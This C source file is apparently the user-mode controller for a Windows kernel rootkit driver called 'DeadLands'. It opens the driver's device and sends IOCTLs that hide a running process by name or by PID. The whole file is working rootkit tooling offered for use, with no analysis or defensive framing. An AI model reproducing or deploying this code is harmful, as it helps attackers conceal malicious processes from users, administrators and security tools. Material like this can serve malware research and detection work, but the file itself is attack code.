#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>

#define SIOCTL_TYPE 40000
# define	IOCTL_DEADLANDS_HIDE_PID	CTL_CODE(SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
# define	IOCTL_DEADLANDS_HIDE_NAME	CTL_CODE(SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

int __cdecl	main(int argc, char* argv[])
{
    HANDLE	hDevice;
    DWORD	NombreByte;
	char*	out[50];
    
	if (argc < 3) {
		printf("No enough arguments: DeadlandsIoctl.exe (name | pid) value\n");
		return (-1);
	}
	
	ZeroMemory(out, sizeof(out));
    hDevice = CreateFile("\\\\.\\DeadLands", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    printf("Handle pointer: %p\n", hDevice);
	if (GetLastError() != ERROR_SUCCESS){
		printf("Can't open DeadLands, are you sure the driver is loaded?\n");
		exit(-1);
	}
	if (_stricmp(argv[1], "NAME") == 0) {
		DeviceIoControl (hDevice, IOCTL_DEADLANDS_HIDE_NAME, argv[2], strlen(argv[2]), out, sizeof(out), &NombreByte, NULL);
		printf("Done!\n");
	} else if (_stricmp(argv[1], "PID") == 0) {
		DeviceIoControl (hDevice, IOCTL_DEADLANDS_HIDE_PID, argv[2], strlen(argv[2]), out, sizeof(out), &NombreByte, NULL);
		printf("Done!\n");
	}
	else
		printf("Unknow switch: DeadlandsIoctl.exe (name | pid) value\n");
    CloseHandle(hDevice);
    return (0);
}
